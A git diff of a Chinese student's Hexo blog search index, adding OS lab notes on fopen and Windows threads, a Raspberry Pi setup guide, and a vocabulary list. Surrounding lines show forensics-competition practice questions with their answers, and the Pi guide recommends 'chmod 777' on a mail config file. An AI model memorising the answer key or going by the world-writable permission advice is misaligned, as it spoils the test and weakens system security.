+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">fwrite(something, <span class="built_in">strlen</span>(something), <span class="number">1</span>, fp);	</span><br></pre></td></tr></table></figure>
+
+
+
+<p>C库函数<code>fopen</code>声明</p>
+<p><a href="https://www.runoob.com/cprogramming/c-function-fopen.html">C 库函数 – fopen() | 菜鸟教程 (runoob.com)</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span></span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="left">模式</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">“r”</td>
+<td align="left">打开一个用于读取的文件。该文件必须存在。</td>
+</tr>
+<tr>
+<td align="left">“w”</td>
+<td align="left">创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。</td>
+</tr>
+<tr>
+<td align="left">“a”</td>
+<td align="left">追加到一个文件。写操作向文件末尾追加数据。如果文件不存在，则创建文件。</td>
+</tr>
+<tr>
+<td align="left">“r+”</td>
+<td align="left">打开一个用于更新的文件，可读取也可写入。该文件必须存在。</td>
+</tr>
+<tr>
+<td align="left">“w+”</td>
+<td align="left">创建一个用于读写的空文件。</td>
+</tr>
+<tr>
+<td align="left">“a+”</td>
+<td align="left">打开一个用于读取和追加的文件。</td>
+</tr>
+</tbody></table>
+<h3 id="【实验截图】"><a href="#【实验截图】" class="headerlink" title="【实验截图】"></a>【实验截图】</h3><p> <img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20220512001437573.png" alt="image-20220512001437573"></p>
+<p><img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20220512001452725.png" alt="image-20220512001452725"></p>
+<p><img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20220511234852274.png" alt="image-20220511234852274"></p>
+<p><img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20220511235712288.png" alt="image-20220511235712288"></p>
+<h3 id="【实验心得体会】"><a href="#【实验心得体会】" class="headerlink" title="【实验心得体会】"></a>【实验心得体会】</h3>]]></content>
       <tags>
-        <tag>算法与数据结构</tag>
+        <tag>操作系统上机</tag>
       </tags>
   </entry>
   <entry>
-    <title>博客更新流程</title>
-    <url>/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/</url>
-    <content><![CDATA[<h1 id="第一次更新"><a href="#第一次更新" class="headerlink" title="第一次更新"></a>第一次更新</h1><h2 id="博客流程"><a href="#博客流程" class="headerlink" title="博客流程"></a>博客流程</h2><h3 id="1、写博客"><a href="#1、写博客" class="headerlink" title="1、写博客"></a>1、写博客</h3><p>执行 hexo new “名字”，hexo 创建该 md 文件，使用 typora 编辑并保存</p>
-<h3 id="2、清缓存-amp-更新渲染"><a href="#2、清缓存-amp-更新渲染" class="headerlink" title="2、清缓存&amp;更新渲染"></a>2、清缓存&amp;更新渲染</h3><p>执行hexo clean清除缓存，</p>
-<p>随后执行hexo g重新渲染静态页面</p>
-<h3 id="3、推送到码云"><a href="#3、推送到码云" class="headerlink" title="3、推送到码云"></a>3、推送到码云</h3><p>执行hexo d</p>
-<h3 id="5-预览本地静态界面"><a href="#5-预览本地静态界面" class="headerlink" title="5.预览本地静态界面"></a>5.预览本地静态界面</h3><p>执行hexo s</p>
-<h3 id="6、更新码云的静态页面"><a href="#6、更新码云的静态页面" class="headerlink" title="6、更新码云的静态页面"></a>6、更新码云的静态页面</h3><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/alpha.png"></p>
-<h3 id="7、重新访问网站"><a href="#7、重新访问网站" class="headerlink" title="7、重新访问网站"></a>7、重新访问网站</h3><p>如果遇到多次刷新无效果的情况。可以试试按F12在网络项下刷新</p>
-<p>=-=-=-=-=-=-=-=-=-=-=-=–=-=-=-=-=-=-=-=-=-=-=-=-=-手打的分割线=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</p>
-<hr>
-<h1 id="第二次更新"><a href="#第二次更新" class="headerlink" title="第二次更新"></a>第二次更新</h1><p>关于butterfly主题，只是刚刚入门，对于自定义方面尚未搞明白</p>
-<h2 id="避雷"><a href="#避雷" class="headerlink" title="避雷"></a>避雷</h2><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/image-20211124112611676.png" alt="image-20211124112611676"></p>
-<p>这个字数统计目前还是不要打开为好，经过反复测试发现如果enable值为true时会报错，博客无法正常加载，太菜了所以不知道原因。。。</p>
-<h2 id="添加博客标签图片"><a href="#添加博客标签图片" class="headerlink" title="添加博客标签图片"></a>添加博客标签图片</h2><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/image-20211124112741755.png" alt="image-20211124112741755"></p>
-<p>在default_cover下照着这样添加图片即可，随机配图，比较省事，感觉效果还可以，如果有时间的话还可以试试自定义配置封面图片</p>
-]]></content>
+    <title>操作系统上机实验三</title>
+    <url>/2022/05/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="实验三-信号通信"><a href="#实验三-信号通信" class="headerlink" title="实验三   信号通信"></a><strong>实验三</strong>   信号通信</h2><h3 id="【实验软硬件环境】"><a href="#【实验软硬件环境】" class="headerlink" title="【实验软硬件环境】"></a>【实验软硬件环境】</h3><p> Linux、Win11、GCC</p>
+<h3 id="【实验目的与内容】"><a href="#【实验目的与内容】" class="headerlink" title="【实验目的与内容】"></a>【实验目的与内容】</h3><p>利用信号通信机制在父子进程几兄弟进程间 进行通信。</p>
+<p>父进程创建一个有名事件， 由子进程发送事件信号，父进程获取事 件信号后进行相应的处理</p>
+<h3 id="【实验程序及分析】"><a href="#【实验程序及分析】" class="headerlink" title="【实验程序及分析】"></a>【实验程序及分析】</h3><h3 id="【实验截图】"><a href="#【实验截图】" class="headerlink" title="【实验截图】"></a>【实验截图】</h3><h3 id="【实验心得体会】"><a href="#【实验心得体会】" class="headerlink" title="【实验心得体会】"></a>【实验心得体会】</h3>]]></content>
       <tags>
-        <tag>博客入门</tag>
+        <tag>操作系统上机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>操作系统上机实验二</title>
+    <url>/2022/05/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%BA%8C/</url>
+    <content><![CDATA[<h2 id="实验二-线程共享进程中的数据"><a href="#实验二-线程共享进程中的数据" class="headerlink" title="实验二   线程共享进程中的数据"></a><strong>实验二</strong>   线程共享进程中的数据</h2><h3 id="【实验软硬件环境】"><a href="#【实验软硬件环境】" class="headerlink" title="【实验软硬件环境】"></a>【实验软硬件环境】</h3><p> Linux、Win11、GCC</p>
+<h3 id="【实验目的与内容】"><a href="#【实验目的与内容】" class="headerlink" title="【实验目的与内容】"></a>【实验目的与内容】</h3><p>了解线程和进程之间的数据共享关系。创建 一个线程，在线程中更改进程中的数据</p>
+<p>在进程中定义全局共享数据，在线程中直接引用该数据进行更改并输出该数据</p>
+<h3 id="【实验程序及分析】"><a href="#【实验程序及分析】" class="headerlink" title="【实验程序及分析】"></a>【实验程序及分析】</h3><h4 id="Windows系统下"><a href="#Windows系统下" class="headerlink" title="Windows系统下"></a>Windows系统下</h4><h5 id="father-cpp文件代码"><a href="#father-cpp文件代码" class="headerlink" title="father.cpp文件代码"></a>father.cpp文件代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> count;<span class="comment">//定义全局共享数据</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID IpParameter)</span> </span>&#123; <span class="comment">//线程函数，其中规定了线程要做的事</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;新线程运行！\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当前进程ID为%d\n\n&quot;</span>,GetCurrentThreadId());</span><br><span class="line">	<span class="keyword">for</span> (count = <span class="number">1</span>; count &lt;= <span class="number">10</span>; count = count + <span class="number">2</span>) &#123; <span class="comment">//在线程中直接引用count变量进行更改并输出新数据</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Now,线程count = %d\n\n&quot;</span>, count);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程等待3秒钟...\n\n&quot;</span>);</span><br><span class="line">	Sleep(<span class="number">3000</span>);<span class="comment">//设置3s的等待时间</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//退出运行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	count = <span class="number">20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;进程运行！\n\n进程count=%d\n\n&quot;</span>, count); <span class="comment">//显示count变量初值</span></span><br><span class="line">	HANDLE hEvent = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//创建新线程并定义相关线程信息</span></span><br><span class="line">	WaitForSingleObject(hEvent, INFINITE); <span class="comment">//等待线程运行结束</span></span><br><span class="line">	CloseHandle(hEvent);<span class="comment">//关闭句柄</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;新线程结束！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;进程结束！\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now,count = %d&quot;</span>, count); <span class="comment">//显示count变量的最终值</span></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><ol>
+<li><p>创建线程</p>
+<p><code>HANDLE hEvent = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); </code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSECURITY_ATTRIBUTES lpThreadAttributes,  </span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPDWORD lpThreadId  )</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>lpThreadAttributes</code>：表示线程内核对象的安全属性，一般传入NULL表示使用默认设置。</p>
+<p><code>dwStackSize</code>：表示线程栈空间大小。传入0表示使用默认大小（1MB）。</p>
+<p><code>lpStartAddress</code>：表示新线程所执行的线程函数地址，多个线程可以使用同一个函数地址。</p>
+<p><code>lpParameter</code>：是传给线程函数的参数。</p>
+<p><code>dwCreationFlags</code>：指定额外的标志来控制线程的创建，为0表示线程创建之后立即就可以进行调度，如果为CREATE_SUSPENDED则表示线程创建后暂停运行，这样它就无法调度，直到调用ResumeThread()。</p>
+<p><code>lpThreadId</code>：将返回线程的ID号，传入NULL表示不需要返回该线程ID号。DWORD类型</p>
+<p>线程创建成功返回新线程的句柄 HANDLE 类型</p>
+</li>
+<li><p>线程函数</p>
+<p><code>DWORD WINAPI ThreadProc(LPVOID IpParameter)</code></p>
+<p>线程函数的规范格式、函数名称（上为ThreadProc）没有限制</p>
+</li>
+<li><p>获取当前线程ID</p>
+<p><code>GetCurrentThreadId()</code></p>
+</li>
+</ol>
+<h3 id="【实验截图】"><a href="#【实验截图】" class="headerlink" title="【实验截图】"></a>【实验截图】</h3><p><img src="/2022/05/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%BA%8C/image-20220513150217892.png" alt="image-20220513150217892"></p>
+<h3 id="【实验心得体会】"><a href="#【实验心得体会】" class="headerlink" title="【实验心得体会】"></a>【实验心得体会】</h3>]]></content>
+      <tags>
+        <tag>操作系统上机</tag>
       </tags>
   </entry>
   <entry>
@@ -1069,14 +1207,6 @@
     <content><![CDATA[<h1 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h1><h2 id="电子数据取证"><a href="#电子数据取证" class="headerlink" title="电子数据取证"></a>电子数据取证</h2><h3 id="活取证："><a href="#活取证：" class="headerlink" title="活取证："></a>活取证：</h3><h4 id="抓取文件metadata-访问记录-、创建时间线、命令历史、日志文件、哈希摘要、内存等等"><a href="#抓取文件metadata-访问记录-、创建时间线、命令历史、日志文件、哈希摘要、内存等等" class="headerlink" title="抓取文件metadata(访问记录)、创建时间线、命令历史、日志文件、哈希摘要、内存等等"></a>抓取文件metadata(访问记录)、创建时间线、命令历史、日志文件、哈希摘要、内存等等</h4><h4 id="采用未受感染的程序进行取证"><a href="#采用未受感染的程序进行取证" class="headerlink" title="采用未受感染的程序进行取证"></a>采用未受感染的程序进行取证</h4><h4 id="U盘、网络-收集证据"><a href="#U盘、网络-收集证据" class="headerlink" title="U盘、网络 收集证据"></a>U盘、网络 收集证据</h4><h3 id="死取证："><a href="#死取证：" class="headerlink" title="死取证："></a>死取证：</h3><h4 id="关机后对硬盘进行镜像操作"><a href="#关机后对硬盘进行镜像操作" class="headerlink" title="关机后对硬盘进行镜像操作"></a>关机后对硬盘进行镜像操作</h4><h2 id="电子取证比赛考察范围"><a href="#电子取证比赛考察范围" class="headerlink" title="电子取证比赛考察范围"></a>电子取证比赛考察范围</h2><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h4 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h4><h4 id="UNIX-Linux"><a href="#UNIX-Linux" class="headerlink" title="UNIX/Linux"></a>UNIX/Linux</h4><h4 id="移动终端"><a href="#移动终端" class="headerlink" title="移动终端"></a>移动终端</h4><h4 id="网络数据取证-等等"><a href="#网络数据取证-等等" class="headerlink" title="网络数据取证 等等"></a>网络数据取证 等等</h4>]]></content>
       <tags>
         <tag>电子数据取证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>方程的建立与方程的一般概念</title>
-    <url>/2022/01/12/%E6%96%B9%E7%A8%8B%E7%9A%84%E5%BB%BA%E7%AB%8B%E4%B8%8E%E6%96%B9%E7%A8%8B%E7%9A%84%E4%B8%80%E8%88%AC%E6%A6%82%E5%BF%B5/</url>
-    <content><![CDATA[]]></content>
-      <tags>
-        <tag>数理方程</tag>
       </tags>
   </entry>
   <entry>
@@ -1163,6 +1293,37 @@
       </tags>
   </entry>
   <entry>
+    <title>树莓派4B新手入门</title>
+    <url>/2022/03/19/%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><p>将树莓派上的SD卡插进读卡器，<a href="https://www.raspberrypi.com/software/">Raspberry Pi OS – Raspberry Pi</a>，在该网站上下载Raspberry Pi Imager程序</p>
+<p><img src="/2022/03/19/%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/image-20220319003832750.png" alt="image-20220319003832750"></p>
+<p>选择操作系统后可以设置时区后再烧录</p>
+<h2 id="接线问题"><a href="#接线问题" class="headerlink" title="接线问题"></a>接线问题</h2><p>树莓派4B的供电要求5V-3A，建议采用相应的电源适配器</p>
+<p>树莓派4B有两个微HDMI接口，如果其中一个接口显示屏反复重启，则更换另一个接口</p>
+<p>显示屏的供电与树莓派的USB端相连即可</p>
+<h2 id="开机后更换apt源"><a href="#开机后更换apt源" class="headerlink" title="开机后更换apt源"></a>开机后更换apt源</h2><h5 id="1、首先在命令行输入以下命令查看自己的树莓派的系统版本："><a href="#1、首先在命令行输入以下命令查看自己的树莓派的系统版本：" class="headerlink" title="1、首先在命令行输入以下命令查看自己的树莓派的系统版本："></a>1、首先在命令行输入以下命令查看自己的树莓派的系统版本：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release  -a</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、打开清华官方文档找到你对应的版本如下图："><a href="#2、打开清华官方文档找到你对应的版本如下图：" class="headerlink" title="2、打开清华官方文档找到你对应的版本如下图："></a>2、打开<a href="https://link.zhihu.com/?target=https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/">清华官方文档</a>找到你对应的版本如下图：</h5><p><img src="/2022/03/19/%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/image-20220319005219877.png" alt="image-20220319005219877"></p>
+<h5 id="3、更改etc-apt-sources-list目录下的文件，然后按Ctrl-S-保存，Ctrl-Q退出。"><a href="#3、更改etc-apt-sources-list目录下的文件，然后按Ctrl-S-保存，Ctrl-Q退出。" class="headerlink" title="3、更改etc/apt/sources.list目录下的文件，然后按Ctrl+S 保存，Ctrl+Q退出。"></a>3、更改<code>etc/apt/sources.list</code>目录下的文件，然后按Ctrl+S 保存，Ctrl+Q退出。</h5><h4 id="如果遇到文件权限不够无法保存的情况"><a href="#如果遇到文件权限不够无法保存的情况" class="headerlink" title="如果遇到文件权限不够无法保存的情况"></a>如果遇到文件权限不够无法保存的情况</h4><p>树莓派配置邮箱时需要用到<code>ssmtp.conf</code>文件，但是默认的权限为‘只读’，所以需要对权限修改才能进行文件的编辑。</p>
+<p>进入该文件所在的文件夹，然后输入修改该文件的全部权限的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`sudo chmod 777 ssmtp.conf` </span><br></pre></td></tr></table></figure>
+
+<h2 id="树莓派关机"><a href="#树莓派关机" class="headerlink" title="树莓派关机"></a>树莓派关机</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo shutdown -h now</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>树莓派</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>方程的建立与方程的一般概念</title>
+    <url>/2022/01/12/%E6%96%B9%E7%A8%8B%E7%9A%84%E5%BB%BA%E7%AB%8B%E4%B8%8E%E6%96%B9%E7%A8%8B%E7%9A%84%E4%B8%80%E8%88%AC%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[]]></content>
+      <tags>
+        <tag>数理方程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>科技英语联系</title>
     <url>/2022/05/10/%E7%A7%91%E6%8A%80%E8%8B%B1%E8%AF%AD%E7%BB%83%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><img src="/2022/05/10/%E7%A7%91%E6%8A%80%E8%8B%B1%E8%AF%AD%E7%BB%83%E4%B9%A0/image-20220510233120825.png" alt="image-20220510233120825"></p>
@@ -1222,26 +1383,25 @@
       </tags>
   </entry>
   <entry>
-    <title>树莓派4B新手入门</title>
-    <url>/2022/03/19/%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><p>将树莓派上的SD卡插进读卡器，<a href="https://www.raspberrypi.com/software/">Raspberry Pi OS – Raspberry Pi</a>，在该网站上下载Raspberry Pi Imager程序</p>
-<p><img src="/2022/03/19/%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/image-20220319003832750.png" alt="image-20220319003832750"></p>
-<p>选择操作系统后可以设置时区后再烧录</p>
-<h2 id="接线问题"><a href="#接线问题" class="headerlink" title="接线问题"></a>接线问题</h2><p>树莓派4B的供电要求5V-3A，建议采用相应的电源适配器</p>
-<p>树莓派4B有两个微HDMI接口，如果其中一个接口显示屏反复重启，则更换另一个接口</p>
-<p>显示屏的供电与树莓派的USB端相连即可</p>
-<h2 id="开机后更换apt源"><a href="#开机后更换apt源" class="headerlink" title="开机后更换apt源"></a>开机后更换apt源</h2><h5 id="1、首先在命令行输入以下命令查看自己的树莓派的系统版本："><a href="#1、首先在命令行输入以下命令查看自己的树莓派的系统版本：" class="headerlink" title="1、首先在命令行输入以下命令查看自己的树莓派的系统版本："></a>1、首先在命令行输入以下命令查看自己的树莓派的系统版本：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release  -a</span><br></pre></td></tr></table></figure>
-
-<h5 id="2、打开清华官方文档找到你对应的版本如下图："><a href="#2、打开清华官方文档找到你对应的版本如下图：" class="headerlink" title="2、打开清华官方文档找到你对应的版本如下图："></a>2、打开<a href="https://link.zhihu.com/?target=https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/">清华官方文档</a>找到你对应的版本如下图：</h5><p><img src="/2022/03/19/%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/image-20220319005219877.png" alt="image-20220319005219877"></p>
-<h5 id="3、更改etc-apt-sources-list目录下的文件，然后按Ctrl-S-保存，Ctrl-Q退出。"><a href="#3、更改etc-apt-sources-list目录下的文件，然后按Ctrl-S-保存，Ctrl-Q退出。" class="headerlink" title="3、更改etc/apt/sources.list目录下的文件，然后按Ctrl+S 保存，Ctrl+Q退出。"></a>3、更改<code>etc/apt/sources.list</code>目录下的文件，然后按Ctrl+S 保存，Ctrl+Q退出。</h5><h4 id="如果遇到文件权限不够无法保存的情况"><a href="#如果遇到文件权限不够无法保存的情况" class="headerlink" title="如果遇到文件权限不够无法保存的情况"></a>如果遇到文件权限不够无法保存的情况</h4><p>树莓派配置邮箱时需要用到<code>ssmtp.conf</code>文件，但是默认的权限为‘只读’，所以需要对权限修改才能进行文件的编辑。</p>
-<p>进入该文件所在的文件夹，然后输入修改该文件的全部权限的命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`sudo chmod 777 ssmtp.conf` </span><br></pre></td></tr></table></figure>
-
-<h2 id="树莓派关机"><a href="#树莓派关机" class="headerlink" title="树莓派关机"></a>树莓派关机</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo shutdown -h now</span><br></pre></td></tr></table></figure>
-
+    <title>科技英语词汇表</title>
+    <url>/2022/05/04/%E7%A7%91%E6%8A%80%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87%E8%A1%A8/</url>
+    <content><![CDATA[<p>an n-valued function    一个n值的函数</p>
+<p>an RS flip-flop    一个RS触发器</p>
+<p>standing    n.    名次表</p>
+<p>debut    n.    初次登台，首次亮相</p>
+<p>haul    n.    赛季（或赛事）得分总数</p>
+<p>unit    n.    单位</p>
+<p>resistance    n.    电阻</p>
+<p>capacitance    n.    电容</p>
+<p>equation    n.    方程</p>
+<p>force    n.     力</p>
+<p>qualitative    adj.    简要的</p>
+<p>the operation of transistors in saturation    晶体管处于饱和状态下的工作情况</p>
+<p>areal charge density in the sillicon    硅中的面电荷密度</p>
+<p>coherent detection    相干检波</p>
 ]]></content>
       <tags>
-        <tag>树莓派</tag>
+        <tag>计科课程</tag>
       </tags>
   </entry>
   <entry>
@@ -1310,28 +1470,6 @@
 <p><strong>“降为（减少到）原来的<strong><strong>1/N</strong></strong>；降低（减少）了<strong><strong>N-1</strong></strong>倍”</strong></p>
 <p><strong>reduce by a factor of N</strong> </p>
 <p><strong>a factor of N lower than that of…</strong></p>
-]]></content>
-      <tags>
-        <tag>计科课程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>科技英语词汇表</title>
-    <url>/2022/05/04/%E7%A7%91%E6%8A%80%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87%E8%A1%A8/</url>
-    <content><![CDATA[<p>an n-valued function    一个n值的函数</p>
-<p>an RS flip-flop    一个RS触发器</p>
-<p>standing    n.    名次表</p>
-<p>debut    n.    初次登台，首次亮相</p>
-<p>haul    n.    赛季（或赛事）得分总数</p>
-<p>unit    n.    单位</p>
-<p>resistance    n.    电阻</p>
-<p>capacitance    n.    电容</p>
-<p>equation    n.    方程</p>
-<p>force    n.     力</p>
-<p>qualitative    adj.    简要的</p>
-<p>the operation of transistors in saturation    晶体管处于饱和状态下的工作情况</p>
-<p>areal charge density in the sillicon    硅中的面电荷密度</p>
-<p>coherent detection    相干检波</p>
 ]]></content>
       <tags>
         <tag>计科课程</tag>
@@ -1479,7 +1617,7 @@
 <p><img src="/2021/11/10/%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%9B2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211111164918421.png" alt="image-20211111164918421"></p>
 <h3 id="21-在何源的个人计算机中，你是否可以找到何源-iPhone-手机的线索。关于他的手机，以下哪条信息不正确？"><a href="#21-在何源的个人计算机中，你是否可以找到何源-iPhone-手机的线索。关于他的手机，以下哪条信息不正确？" class="headerlink" title="21 在何源的个人计算机中，你是否可以找到何源 iPhone 手机的线索。关于他的手机，以下哪条信息不正确？"></a>21 在何源的个人计算机中，你是否可以找到何源 iPhone 手机的线索。关于他的手机，以下哪条信息不正确？</h3><p>A. IMEI：359461082062689 </p>
 <p>B. Serial Number：F17V1L6EHG70 </p>
-<p>C. Apple ID ：<a href="mailto:&#x68;&#x65;&#121;&#x75;&#97;&#110;&#53;&#49;&#x36;&#64;&#x69;&#x63;&#x6c;&#111;&#x75;&#100;&#x2e;&#x63;&#111;&#x6d;">&#x68;&#x65;&#121;&#x75;&#97;&#110;&#53;&#49;&#x36;&#64;&#x69;&#x63;&#x6c;&#111;&#x75;&#100;&#x2e;&#x63;&#111;&#x6d;</a> </p>
+<p>C. Apple ID ：<a href="mailto:&#x68;&#101;&#x79;&#117;&#x61;&#x6e;&#x35;&#49;&#54;&#64;&#x69;&#x63;&#108;&#x6f;&#x75;&#x64;&#46;&#99;&#111;&#x6d;">&#x68;&#101;&#x79;&#117;&#x61;&#x6e;&#x35;&#49;&#54;&#64;&#x69;&#x63;&#108;&#x6f;&#x75;&#x64;&#46;&#99;&#111;&#x6d;</a> </p>
 <p>D. MSISDN: 85259114189 </p>
 <p>E. 无 </p>
 <p><strong>答案：C</strong></p>
@@ -1643,11 +1781,11 @@
 <p><strong>答案：D</strong></p>
 <p>翻一翻，找一找</p>
 <p><img src="/2021/11/10/%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%9B2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211111201032223.png" alt="image-20211111201032223"></p>
-<h3 id="44-在何源的个人计算机中，用户“He-Yuan”曾用-Microsoft-Edge-浏览器注册过一个新的-Gmail-account-请从网页标题痕迹中找出此账号。"><a href="#44-在何源的个人计算机中，用户“He-Yuan”曾用-Microsoft-Edge-浏览器注册过一个新的-Gmail-account-请从网页标题痕迹中找出此账号。" class="headerlink" title="44 在何源的个人计算机中，用户“He Yuan”曾用 Microsoft Edge 浏览器注册过一个新的 Gmail account,请从网页标题痕迹中找出此账号。"></a>44 在何源的个人计算机中，用户“He Yuan”曾用 Microsoft Edge 浏览器注册过一个新的 Gmail account,请从网页标题痕迹中找出此账号。</h3><p>A. <a href="mailto:&#106;&#97;&#x63;&#x6b;&#104;&#x65;&#54;&#54;&#x36;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#109;">&#106;&#97;&#x63;&#x6b;&#104;&#x65;&#54;&#54;&#x36;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#109;</a> </p>
